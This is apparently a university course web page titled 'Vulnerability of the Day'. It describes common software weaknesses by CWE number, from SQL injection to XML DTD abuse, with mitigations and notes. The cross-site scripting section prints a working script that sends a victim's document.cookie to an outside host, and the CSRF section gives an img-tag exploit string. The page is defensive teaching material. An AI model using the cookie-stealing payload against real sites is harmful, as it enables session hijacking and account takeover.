<?xml version='1.0' encoding='utf-8' ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Vulnerabilities of the Day</title>

<link type="text/css" rel="stylesheet" href="../main.css" />
<link type="text/css" rel="stylesheet" href="votd.css" />
<script language="javascript" type="text/javascript" src="toc.js"></script>

</head>
<body onload="createTOC()">
	<h1>Vulnerability of the Day</h1>
	<p>
		<a href="../schedule.html">Back to schedule</a>
	</p>

	<div id=toc></div>

	<!-- include buffer overflow here -->

	<!-- include integer overflow here -->


	<h2>SQL Injection</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/89.html">CWE-89</a>
	</p>
	<p>
		<b>Examples:</b> <a href="sql-injection.zip">sql-injection.zip</a>.
	</p>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>The <b>only</b> acceptable mitigation are properly-used
			prepared statements. These API calls are supported by all SQL
			standards, and separate the logic of the query from its input
			entirely (i.e. pre-compile the SQL). No string concatenation should
			be used.
		</li>
		<li>Escaping characters has proven to be a poor substitute, as
			changing character sets makes this too hard.</li>
		<li>Using an OO-relational mapper (e.g. Hibernate) can mitigate
			this. However, string concatenation on the Hibernate query language
			can result in basically the same thing.</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>Currently the top problem on the CWE Top 25 vulnerabilities.
			Very common today.</li>
		<li>Can be done in all languages: Java, Ruby, PHP</li>
		<li>Not particularly hard to find or fix, you just have to know
			about it.</li>
		<li>A lot of people will tell you that you need lots of tools to
			fix SQL injection. It's all snakeoil... just use prepared statements.</li>
		<li>See this <a href="http://xkcd.com/327/">classic XKCD</a>.
		</li>
	</ul>


	<h2>OS Command Injection</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/78.html">CWE-78</a>
	</p>
	<p>
		<b>Examples:</b> <a href="os-command-injection.zip">os-command-injection.zip</a>.
		Also, <a href="http://www.apacheweek.com/issues/02-03-22#security">Apache
			HTTPD for Windows</a> had an issue with this where they allowed the pipe
		(|) character. Here's the actual <a
			href="http://svn.apache.org/viewvc?view=revision&sortby=rev&revision=94092">SVN
			commit</a> for the fix, which involves additional logic for escaping
		characters.
	</p>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Many languages allow limiting an OS call to a single command,
			which can limit the injection.</li>
		<li>Generally speaking, be very careful with OS calls. Avoid, if
			possible. Usually, APIs exist that can accomplish the same thing.</li>
		<li>Only allow certain input to these commands, as opposed to
			blocking or escaping bad output.</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>Web application technologies like PHP and Ruby on Rails make
			these OS calls very easy these days. These are very dangerous, as
			getting access to the underlying web server can have a huge impact.</li>
		<li>It's tempting to think you can just use a quick grep function
			or call a separate script, but be sure to think twice about that
			interaction.</li>
	</ul>

	<h2>Hard-coded Credentials</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/798.html">CWE-798</a>
	</p>
	<p>
		<b>Examples:</b> <a href="hardcoded-credentials.zip">hardcoded-credentials.zip</a>
	</p>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Extract your credentials out to a properties file, then
			install your system with the proper permissions on that properties
			file.</li>
		<li>Corollary: don't include default passwords anyway, make the
			user define them upon installation</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>Believe it or not, this is another common problem. It's a
			common misconception that you can keep secrets in your source code.</li>
		<li>Same kind of concept applies to encryption keys, or
			pseudo-random number generator seeds.</li>
		<li>Obfuscation isn't the answer because reverse engineering is
			easier than you think. (Takes time and some skill, which crowds
			have).</li>
		<li>License keys have had this problem. Many companies today
			resort to a remote authentication for license products. But even
			then, it's still a tough problem today for desktop client
			applications (e.g. Windows Genuine Advantage).</li>
		<li>Hardcoding credentials also breaks maintainability and
			deployability. What if your database password was guessed, and you
			had to change it?</li>
	</ul>

	<h2>Log overflow</h2>

	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/400.html">CWE-400</a> for
		a general description. Related CWEs are <a
			href="http://cwe.mitre.org/data/definitions/779.html">CWE-779</a> and
		<a href="http://cwe.mitre.org/data/definitions/770.html">CWE-770</a>.
		Printing out to a console or logger usually ends up in a text file. If
		an attacker knows this, and the logging is unrestricted, then
		attackers can fill up the log file and crash the machine by filling up
		the hard drive. This is a denial of service attack that is
		particularly difficult to recover from. Plus, weird things happen when
		the entire hard drive is completely out of bytes, so attackers can
		take advantage of this.
	</p>

	<p>
		<b>Examples:</b> <a href="log-overflow.zip">log-overflow.zip</a>.
		Linux kernel has had this issue as well.
	</p>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Use a logging library (e.g. log4j). In configuring your
			logger, be sure to use rolling log files. These can be rotated on a
			daily basis, or by size.</li>
		<li>Be sure to actually test this functionality yourself.</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>Mostly an issue in applications that run on servers, although
			desktop clients are not immune to this</li>
		<li>The disadvantage of this mitigation is that you can
			potentially lose your logs if they get over-rotated. Attackers can
			potentially take advantage of this fact by intentionally overflowing
			the logs to erase the evidence. But other protections, like request
			limits, can mitigate that problem too.</li>
		<li>As a general rule, avoid unlimited hard drive storage (e.g.
			uploading photos). Sometimes it's easier to just store images as
			BLOBS in a database (where the table sizes are often limited by
			default), as opposed to dealing with the OS directly.</li>
	</ul>

	<h2>Path Traversal</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/22.html">CWE-22</a>
	</p>
	<p>
		<b>Examples:</b> <a href="path-traversal.zip">path-traversal.zip</a>.
		Also, see <a href="http://tomcat.apache.org/security-5.html">this
			issue (CVE-2009-2902)</a> or its entry in the <a
			href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2902">CVE</a>
		in Tomcat where they allowed web applications be named "...war", which
		could be used for arbitrary file deletion outside of the webapp
		sandbox.
	</p>

	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Remember that path strings are very flexible - they can be
			relative or absolute. So <code>a/b/c.txt</code> is the same as <code>a/b/../b/c.txt</code>.
			The <em>canonical</em> form of any file is just the absolute path
			name, e.g. <code>/home/someone/a.txt</code>
		</li>
		<li>Better to leave the canonicalization to the programming
			language. Java uses <code>getCanonicalPath()</code>, it's called <code>realpath()</code>
			in C, PHP, and Perl. They actually ping the filesystem to interpret
			the path string.
		</li>
		<li>Tactic: canonicalize your sandboxed directory, canonicalize
			the final filename you are about to open, and compare the two with <code>startsWith</code>.
		</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>Another one that's common to web applications especially.
			This often appears in PHP apps that delegate code to the operating
			system, or use flat file storage.</li>
		<li>Akin to SQL Injection where it's string concatenation gone
			wrong. Sadly, there's no version of a prepared statement for files
			(e.g. set the directory separately from the file name), so <code>new
				File(sandbox, filename)</code> is still vulnerable to this.
		</li>
		<li>The myriad of exploits for this one over the years has shown
			that blacklisting is not a good approach. Better to just convert to
			absolute, and check the directory from there.</li>
		<li>Can also be a danger with configuration files. In the
			interest of defense in depth, it might be wise to do this kind of
			check when a properties file contains the name of another file.</li>
	</ul>

	<h2>Cross-Site Scripting (XSS)</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/79.html">CWE-79</a>
	</p>
	<p>
		<b>Examples:</b> <a href="xss-in-tomcat.zip">xss-in-tomcat.zip</a>.
		This is a standalone installation of the Tomcat server, with a webapp
		called
		<code>xss</code>
		already deployed. After unzipping, run
		<code>bin/startup.bat</code>
		. Direct your browser to <a href="http://localhost:8080/xss">http://localhost:8080/xss</a>
		.
	</p>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Converting HTML characters to their escaped form (e.g. &lt;
			to &amp;lt;) is the safest approach. Only allowing some input is a
			good idea, but sometimes you want certain characters to be allowed
			and escaping allows for that flexibility.</li>
		<li><b>However!</b> Knowing which characters to escape is very
			tricky. I strongly recommend using an external library, and not just
			rolling your own. Check out how complicated it is at <a
			href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet">OWASP's
				XSS Cheat Sheet</a>.</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>Widely considered among the most dangerous vulnerabilities
			today. XSS vulnerabilities have affected GMail, Twitter, Facebook,
			Hotmail, Yahoo Mail, and just about every other major web application
			out there.</li>
		<li>Executing Javascript on another person's machine can result
			in a vast number of exploits. In every case, the asset of cross-site
			scripting is the user interface. The two main exploits of XSS are:
			<ul>
				<li><em> session hijacking</em>, where you steal the
					authentication token from the victim's cookie and use it to log in.
					For example: <pre>
&lt;script&gt;
	x = new XMLHttpRequest();
	x.open("GET", "http://www.postbin.org/1187sam?s=" + document.cookie, true);
	x.send();
&lt;/script&gt;</pre> This is a silent AJAX call to a remote site, which an
					attacker then monitors anonymously, stealing your authentication
					token. Having the authentication token gives the attacker the
					ability to log in as the victim (as long as they stay logged in).
					From there, the attacker can can reset passwords, set up other
					accounts, set up permanent scripts, anything.</li>
				<li><em>web defacement</em>, where you can modify the page to
					have an extra form asking for someone's password, which gets sent
					off to a remote site. A user would not be able to tell that they
					just sent their password to a malicious site.</li>
			</ul>
		</li>
		<li>A good discussion of XSS, including some fascinating
			historical exploits, is on the <a
			href="http://guides.rubyonrails.org/security.html#cross-site-scripting-xss">Ruby
				on Rails security page</a>.
		</li>
		<li>Note that XSS does not always have to be done inside
			&lt;script&gt; tags, it can be done in CSS injection, inside image
			metadata, and in many other situations.</li>
	</ul>


	<h2>Cross-Site Request Forgery</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/352.html">CWE-352</a>.
		Another <a href="http://www.cgisecurity.com/csrf-faq.html">good
			description</a>. Essentially, allowing HTML tags in your input can allow
		attackers to force users to make HTTP GET requests silently (e.g.
		using
		<code>&lt;img&gt;</code>
		).
	</p>
	<p>
		<b>Examples:</b> Use the <a href="xss-in-tomcat.zip">XSS example </a>
		app to construct a CSRF attack. An example exploit string would be
		<code>&lt;img src="http://localhost:8080/index.jsp"/&gt;</code>
	</p>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Input validation is the answer here. However, these methods
			can be quite complex to nail down.</li>
		<li>Consider why you are allowing clients to create GET requests
			for each other clients anyway (e.g. email clients hiding <code>img</code>
			tags from users initially).
		</li>
		<li>As a rule, don't allow GET actions to perform persistent
			modifications to the website. GET requests are much easier to forge
			than POST requests.</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>Technically, this is not cross-site scripting as no script is
			being executed on user's browser. However, CSRFs allow attackers to
			fool victims into sending GET requests to malicious sites or by
			modifying something in the app itself</li>
		<li>CSRF is one reason that many email clients don't show images
			upon initially showing an email.</li>
	</ul>

	<h2>Open Redirect</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/601.html">CWE-601</a>
	</p>
	<p>
		<b>Examples:</b>
	</p>
	<ul>
		<li><a href="open-redirect.zip">open-redirect.zip</a>. Using the
			XSS web application example, place this JSP page into the <code>webapps/xss/</code>
			folder.</li>
		<li>Also, the popular bug tracking engine Trac <a
			href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2951">had
				one of these</a>, take a look at <a
			href="http://trac.edgewall.org/changeset/7224/branches/0.10-stable">the
				fix</a>.
		</li>
	</ul>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Input validation, although more than just validating
			character strings - look up the URL itself. Make your whitelist a set
			of known, safe, URLs within your app. Only allowing input that
			redirects to your own site is also a big step.</li>
		<li>Like file paths and path traversal vulnerabilities, URLs can
			get pretty complicated. Java has a <code>normalize()</code> method in
			the <a
			href="http://docs.oracle.com/javase/7/docs/api/java/net/URI.html#normalize%28%29">URI</a>
			class that helps you canonicalize your URL before checking it. This
			is especially helpful if you are in an untrusted site situation (e.g.
			your webapp is hosted on the same site as untrusted webapps and you
			want to block intra-site redirects like <code>../evilsite</code>).
		</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>While our example uses a form post, exploits more often occur
			in URL parameters (e.g. <code>http://yourwebsite.com/somethingvulnerable.jsp?redirect=www.evilwebsite.com</code>)
		</li>
		<li>Detecting this one is the hard part. Most usages of redirects
			are when the URLs are not connected to user input (and are therefore
			safe). But, whenever user input eventually leads to a redirect,
			consider this issue.</li>
		<li>This is a popular vulnerability used in phishing attacks
			(i.e. social engineering). Suppose PayPal had an open redirect
			vulnerability. Then an attacker could spam people asking them to
			check their paypal accounts. The URLs start with <code>paypal.com</code>,
			so most users would consider them safe and click through.
		</li>
	</ul>

	<h2>Insecure PRNGs</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/338.html">CWE-338</a>.
		Most pseudo-random number generators (PRNGs) are not designed to be
		secure, and with improper management can be easily guessed by a
		variety of methods.
	</p>
	<p>
		<b>Examples:</b>
	</p>
	<ul>
		<li><a href="prngs.zip">prngs.zip</a>. DeckDealer is a simplified
			example of a card shuffling class where the PRNG was seeded by the
			time, and an outside program could just create a database of possible
			seeds and check the results.</li>
		<li>A famous example of this occurred in Debian distributions of
			OpenSSL, as described in depth <a
			href="http://digitaloffense.net/tools/debian-openssl/">here </a>.
		</li>
	</ul>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Use PRNGs that are designed to be secure: e.g. <code>java.util.SecureRandom</code>
			instead of <code>java.util.Random</code>.
		</li>
		<li>Don't use predictable seeds, such as:
			<ul>
				<li>Seeds that are reset consistently. Re-seeding doesn't make
					the PRNG any more secure (or "random").</li>
				<li>Millisecond time. In 100 years, there are only 3*10^12
					milliseconds, which a botnet can easily enumerate through.</li>
				<li>Nanosecond time. If attackers know roughly when you reset
					your seed, they can narrow down the space for guessing.</li>
				<li>Process IDs. Even smaller space than millisecond time.</li>
				<li>Anything else that can be guessed.</li>
			</ul>Instead, have the user set a secret token upon installation, and
			protect that secret token.
		</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>

	<ul>
		<li>The need for secure PRNGs arises in many different
			situations, such as cryptographic seeds, multi-factor authentication
			mechanisms, and session tokens. In most cases, a broken PRNG has
			devastating effects (e.g. predicting all future session tokens)</li>
	</ul>


	<h2>Excessive Login Attempts</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/307.html">CWE-307</a>.
		Users should not get unlimited login attempts to avoid brute force
		password guessing.
	</p>
	<p>
		<b>Examples:</b> None provided - this is pretty much ubiquitous.
	</p>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Many mitigations exist, some of which are helpful, others are
			not.</li>
		<li>In a time window that lasts a few seconds, only allow one
			authentication attempt from one IP address and one thread at a time.
			This can greatly limits the number of passwords that can be guessed.</li>
		<li>Limit the number of wrong password requests, otherwise lock
			the account. Don't go too far with this, because most users get very
			annoyed about it</li>
		<li>Some websites like Wikipedia will ban specific IP addresses,
			but those can be spoofed by <a
			href="https://www.torproject.org/projects/torbrowser.html.en">anonymizing
				browsers</a>.
		</li>
		<li>Using a CAPTCHA technique to verify that you are human is one
			method to slow down the possible requests from automated scripts. The
			<a href="http://www.google.com/recaptcha">reCAPTCHA</a> project is a
			well-respected project for this. However, these can also be <a
			href="http://www.blackhat-seo.com/2009/captcha-farms/">farmed</a> by
			paying users or forcing them to do a CAPTCHA prior to playing a game
			or something.
		</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>

		<li>Always provide a manual way to reset an account with human
			judgement.</li>
		<li>Due to the diversity (and disagreement) on how to handle
			this, most servers and frameworks provide "flexible" (read:
			complicated) methods of handling this. Usually it involves a
			third-party plug-in, so make sure it's tested properly.</li>
	</ul>
	<h2>Hashing and Salt</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/759.html">CWE-759</a>. If
		an attacker breaks in to a system that provides authentication, they
		should not be able to access the passwords. Historically, people would
		hash (digest) algorithms to accomplish this. However, commonly-guessed
		passwords are still vulnerable, as attackers can make "rainbow
		tables", or digests of common passwords.
	</p>
	<p>
		<b>Examples:</b>
	</p>
	<ul>
		<li><a href="hashing-salt.zip">hashing-salt.zip</a>. The given
			example is an authentication example that demonstrates the different
			ways you can store a password and still authenticate. User sets their
			password, which gets salted and then digested (hashed). Every time
			the user authenticates, the system then salts and digests the
			password, and checks the results.</li>
	</ul>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Append a secret "salt" string that only the server knows
			before digesting. This will make those digests unrecognizable.</li>
		<li>Make sure that the salt is set by the final user, not
			hardcoded or set by default. Server salt is like default passwords or
			PRNG seeds - secrets that users should set by default.</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>Don't ever store passwords in plain text. This means that
			your "reset password" feature, should <em>never</em> email passwords
			in plaintext (because you don't have that anymore!). If you ever
			notice a website that does this, they are not hashing their
			passwords.
		</li>
		<li>Don't make your salt easily guessable. Any long string is
			fine, since you won't need to remember again.</li>
	</ul>

	<h2>Java Reflection Abuse</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/470.html">CWE-470</a>.
		Despite what you might assume, Java allows you to access private
		variables in other classes via its Reflection API. In untrusted API
		situations (e.g. plug-in architectures), this can lead to malicious
		libraries accessing and tampering with sensitive data.
	</p>
	<p>
		<b>Examples:</b>
	</p>
	<ul>
		<li><a href="reflection-abuse.zip">reflection-abuse.zip</a>.
			Running <code>make</code> will result in the exploit, <code>make
				safe</code> results in running it under a security manager.</li>
		<li>The ColdFusion database access API has this vulnerability (<a
			href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2331">CVE-2004-2331</a>)
		</li>
	</ul>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Use the Java Security Manager to limit privileged API
			situations. While this feature is turned off by default, it's
			actually critical for deploying a Java application securely (e.g. in
			a servlet container).</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>Many Java servers utilize a strict, security policy (<a
			href="http://tomcat.apache.org/tomcat-7.0-doc/security-manager-howto.html">e.g.
				Tomcat</a>), however, many default installations of such servers do not
			force you to set up your security policy with the Java virtual
			machine.
		</li>
		<li>The Java security manager blocks all kinds of other sensitive
			actions, such as <code>System.exit(1);</code>, file system access, or
			using reflection to instantiate singletons.
		</li>
		<li>The Deployment &amp; Distribution lecture covers more details
			on the Java Security Manager</li>
		<li>PHP also allows this kind of behavior, and third-party
			security manager libraries provide similar functionality as the Java
			Security Manager.</li>
	</ul>

	<h2>Resource Exhaustion</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/400.html">CWE-400</a>,
		also: <a href="http://cwe.mitre.org/data/definitions/772.html">CWE-772</a>
		and <a href="http://cwe.mitre.org/data/definitions/401.html">CWE-401</a>.
		Computational resources are exhausted, usually compromising
		availability. Depending on the situation, information disclosure is
		also possible. This usually comes from not closing resources, or
		allowing unrestricted input sizes.
	</p>
	<p>
		<b>Examples:</b> Many diverse types of resource exhaustion can arise
		all the time.
	</p>
	<ul>
		<li>(<a
			href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2121">CVE-2008-2121</a>)
			Allocating memory prior to the handshake in the TCP networking
			protcol allows attackers to fill up memory (aka <a
			href="http://capec.mitre.org/data/definitions/469.html">TCP SYN
				Flood attack</a>, Wikipedia has a good explanation of it: <a
			href="http://en.wikipedia.org/wiki/SYN_flood"></a>)
		</li>
		<li>Problems with the mutexes and file descriptors in the Linux
			kernel. Noticed and fixed by Linus Torvalds himself: <a
			href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=8141c7f3e7aee618312fa1c15109e1219de784a7">here</a>
			and <a
			href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=fc6b177dee33365ccb29fe6d2092223cf8d679f9">here</a>.
			Also: an in-depth discussion on the Red Hat Bugzilla entry can be
			found <a href="https://bugzilla.redhat.com/show_bug.cgi?id=771764">here</a>
		</li>
		<li>(<a
			href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4885">CVE-2011-4885</a>)
			Allowing an unrestricted number of variables in PHP's <code>$POST</code>
			results in hash collisions that eat up the server's CPU. Fixes are <a
			href="http://svn.php.net/viewvc?view=revision&revision=321003">here</a>
			and <a href="http://svn.php.net/viewvc?view=revision&revision=321040">here</a>
		</li>
		<li>(<a
			href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2164">CVE-2004-2164</a>)
			The VP-ASP shopping cart software had a vulnerability where they
			forgot to close a database connection, discussed <a
			href="http://www.securityfocus.com/bid/11228/discuss">here</a>.
		</li>
	</ul>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Remember to close your resources.</li>
		<li>At the design level, try to pool your resources in one place
			so can be managed and closed if gone unused (e.g. database connection
			pooling)</li>
		<li>As mentioned in the Defensive Coding lectures, invest a some
			effort into safe exception handling, such as <code>finally</code> in
			Java.
		</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>This is another common class of vulnerability that usually
			depends greatly on the design and technology being used</li>
		<li>This is one vulnerability that will never really be fixed by
			tools or technologies, but by just careful coding. That said...
			<ul>
				<li>Tools like <a href="http://valgrind.org/">Valgrind</a> can
					help detect memory leaks
				</li>
				<li>Static analysis tools claim to detect this, but their false
					positive ratios on this particular problem are atrocious
					(especially since static analyzers only look at one file at a
					time).</li>
			</ul>
		</li>
		<li>Filling up the hard drive with logs as in Log Overflow is an
			example of Resource Exhaustion.</li>
	</ul>

	<h2>Log Neutralization</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/117.html">CWE-117</a>. If
		you allow newlines in your logs, then attackers can forge log entries,
		throwing investigations off. Related to generalized CRLF Injection ( <a
			href="http://cwe.mitre.org/data/definitions/93.html">CWE-93</a>)
	</p>
	<p>
		<b>Examples:</b>
	</p>
	<ul>
		<li><a href="log-neutralization.zip">log-neutralization.zip</a></li>.
		Run
		<code>./make</code>
		instead of
		<code>make</code>
		<li>PayPal had this issue hit them (<a
			href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0201">CVE-2006-0201</a>)
		</li>
	</ul>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Don't allow newlines in your logs - remove them entirely.</li>
		<li>Depending on what tools are used to analyze logs, the CRLF
			character might not be enough. Consider <code>&lt;br&gt;</code> if
			you can view logs online, too.
		</li>
		<li>Don't forget to log the situation where a newline is
			injected, too.</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>This is one vulnerability that is explicitly a <em>repudiation</em>
			threat.
		</li>
		<li>By itself, this is pretty innocuous. In conjunction with
			other attacks, an attacker can provide misinformation in the logs
			that throws off the post-exploit investigation.</li>
		<li>Developers who have access to previous logs (or similar logs)
			can easily guess or reverse-engineer your patterns, making the result
			indistinguishable. Take a look at <a
			href="http://capec.mitre.org/data/definitions/93.html">CAPEC
				attack pattern 93</a>.
		</li>
		<li>Oddly enough, common logging libraries like <code>java.util.logging</code>
			and <code>log4j</code> don't have an option to remove newlines.
		</li>
	</ul>

	<h2>Error Message Information Leak</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/209.html">CWE-209</a>.
		Error messages often include technical information that should not be
		exposed to attackers.
	</p>
	<p>
		<b>Examples:</b>
	</p>
	<ul>
		<li>Stacktraces can give away information on the configuration,
			database tables, credentials, internal hosts, even your architecture.</li>
		<li>Specific version numbers for the server can be a big hint
			(attackers notice that the server hasn't been patched recently)</li>
		<li><a
			href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-2049">CVE-2008-2049</a>.
			A POP3 email server accidentally discloses a password.</li>
		<li><a href="http://www.cvedetails.com/cve/CVE-2008-1579">CVE-2008-1579</a>,
			Mac OS X wiki server divulged usernames in an error message.</li>
	</ul>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Use a top-level exception handler, where any exception
			information gets hidden from the user. Provide a safer place to
			output the technical details, such as the error logs.</li>
		<li>Wrap security-sensitive exceptions inside your own exceptions
			(e.g. in Java, use <code>getCause()</code>) so that traceability back
			to the original failure is kept.
		</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>Yes, we cannot rely on security through obscurity, but why
			give attackers more information than they need?</li>
		<li>This can make you a bigger target. It's so simple to catch
			all of your exceptions that attackers will assume there are more
			problems than just error message leakage. Once attackers realize that
			you are not hiding error message information, they can also try to
			force errors in other situations to get at sensitive information.</li>
		<li>Users don't like seeing technical details anyway, as it loses
			that touch of professionalism.</li>
	</ul>

	<h2>Uncontrolled Format String</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/134.html">CWE-134</a>. In
		C, printing using
		<code>printf(str)</code>
		instead of
		<code>printf("%s", str)</code>
		results in the user being able to control the format string. This is
		especially egregious when you look at the
		<code>%x</code>
		and
		<code>%n</code>
		codes, which allow users to read and write arbirary bytes to arbitrary
		memory locations.
	</p>
	<p>
		<b>Examples:</b>
	</p>
	<ul>
		<li><a href="format-string.zip">format-string.zip</a>. Run <code>make</code>
			to see some interesting exploits. Also, be sure to check out what <code>read-memory.rb</code>
			does (requires <code>make</code> first)</li>
	</ul>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>Just use a format string!</li>
		<li>Watch your compiler warnings, which look like: <code>warning:
				format not a string literal and no format arguments </code></li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>The key that makes the <code>%x</code> code work is that
			printf is a varargs function. If you add more <code>%x</code> codes
			to the string, printf just starts reading memory locations from where
			it left off - right at the call stack.
		</li>
		<li>This one is just as severe as buffer overflow, as it can
			allow arbitrary remote code execution.</li>
		<li><a
			href="http://www.amazon.com/Buffer-Overflows-Format-String-Schwachstellen-Tobias-Klein/dp/3898641929/">Entire
				books</a> have been written on elaborate exploits of format string
			vulnerabilities</li>
	</ul>

	<h2>XML Embedded DTDs</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/827.html">CWE-827</a>.
		XML allows for validation of their input using Document Type
		Definitions (DTDs). These DTDs are pretty flexible, and allow for
		things like reading in external files. However, users can embed their
		own DTDs in the header of an XML file, thereby accessing the file
		system directly.
	</p>
	<p>
		<b>Examples:</b> <a href="xml-dtd.zip">xml-dtd.zip</a>.
	</p>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li>In most languages, you can disable validation of embedded
			DTDs with ease.</li>
		<li>However, make sure you test this closely, as Java's built-in
			SAX parser does not always respect <code>setValidating(false)</code>
			and <code>setExpandEntityReferences(false)</code> depending on the
			environment. In that case, you need to override the entity resolver
			(see the given example).
		</li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li>Ironically, DTDs were originally intended for XML validation,
			but it got warped into more of a user convenience. So yes, fixing
			this vulnerability means <em>turning off</em> "validation".
		</li>
		<li>A similar vulnerability is the <a
			href="http://cwe.mitre.org/data/definitions/776.html">XML bomb</a>,
			which expands XML entities expoentially (causing a DoS by filling up
			the memory). However, most XML parsers have limiting defaults for
			expanding XML entities, so that XML bombs are (practically speaking)
			no longer an issue as long as developers don't explicitly turn off
			the limits. An example XML bomb is included in the above zip.
		</li>
	</ul>

	<!-- 
	<h2>NAME</h2>
	<p>
		<b>Description. </b> See <a
			href="http://cwe.mitre.org/data/definitions/??.html">CWE-??</a>
	</p>
	<p>
		<b>Examples:</b> <a href="??.zip">??.zip</a>
	</p>
	<p>
		<b>Mitigations: </b>
	</p>
	<ul>
		<li></li>
		<li></li>
		<li></li>
	</ul>
	<p>
		<b>Notes</b>
	</p>
	<ul>
		<li></li>
		<li></li>
	</ul>
	-->
	<div id=footer>
		<a href="#">Top</a>
	</div>
</body>
</html>
